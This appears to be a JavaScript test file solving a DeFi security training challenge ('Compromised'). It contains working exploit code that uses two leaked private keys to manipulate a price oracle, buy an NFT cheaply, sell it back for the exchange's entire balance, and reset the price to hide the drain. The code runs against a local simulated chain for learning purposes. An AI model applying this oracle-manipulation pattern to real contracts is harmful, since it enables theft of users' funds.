const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    /**
     * @dev
     * Exploit Overview:
     * 
     * This is a fun challenge. We are given two random hex strings to start with 
     * which when decoded gives base64 and then decoded again gives us two more hex strings
     * which turn out to be the private keys of two of the oracles, useful!
     * 
     * Since we then control 2/3 oracles we can control the median price, as the median is 
     * will be the middle price of the 3.
     * 
     * So since we control price we can set the price to be super low, purchase the NFT
     * and then sell it back to the exchange at the price of the balance of the exchange 
     * to steal all the funds of the exchange.
     * 
     * Then to meet the final condition of the success condition we just need to reset 
     * the oracle price
     * 
     * So the exploit goes:
     * 
     * 1. Setup oracle wallets with private keys
     * 2. Set median price to something small but > 0
     * 3. Purchase NFT at new low price
     * 4. Set median price to the balance of the Exchange contract
     * 5. Sell NFT back to exchange for the new median price of the exchange
     * 6. Reset oracle price to initial conditions
     */
    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

        const oracle1 = new ethers.Wallet(key1, ethers.provider);
        const oracle2 = new ethers.Wallet(key2, ethers.provider);

        console.log(oracle1.address);
        console.log(oracle2.address);

        const orc1Trust = oracle.connect(oracle1);
        const orc2Trust = oracle.connect(oracle2);


        const setMedianPrice = async (amount) => {
            // Before
            let currMedianPrice = await oracle.getMedianPrice("DVNFT");
            console.log("Current median price is", currMedianPrice.toString());

            console.log("Posting to oracle 1");
            await orc1Trust.postPrice("DVNFT", amount)
            
            // After 1 oracle
            currMedianPrice = await oracle.getMedianPrice("DVNFT");
            console.log("Current median price is", currMedianPrice.toString());

            console.log("Posting to oracle 2");
            await orc2Trust.postPrice("DVNFT", amount)

            // After 2 oracle
            currMedianPrice = await oracle.getMedianPrice("DVNFT");
            console.log("Current median price is", currMedianPrice.toString());
        }

        // Set price to 0.01.
        let priceToSet = ethers.utils.parseEther("0.01");
        await setMedianPrice(priceToSet);

        const attackExchange = exchange.connect(player);
        const attackNFT = nftToken.connect(player);

        // Purchase the NFT
        await attackExchange.buyOne({
            value: priceToSet
        })

        // Verify that we own the newly minted NFT
        const tokenId = 0;
        const ownerId = await attackNFT.ownerOf(tokenId);
        expect(ownerId).to.equal(player.address);

        console.log("Setting price to balance of exchange");
        const balOfExchange = await ethers.provider.getBalance(exchange.address);

        // Set the price of the NFT to the current balance of the exchange
        priceToSet = balOfExchange
        await setMedianPrice(priceToSet);


        console.log("Selling NFT for the median price");
        await attackNFT.approve(attackExchange.address, tokenId);
        await attackExchange.sellOne(tokenId);

        // Reset oracle price to intial price to meet final condition.
        priceToSet = INITIAL_NFT_PRICE;
        await setMedianPrice(priceToSet);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
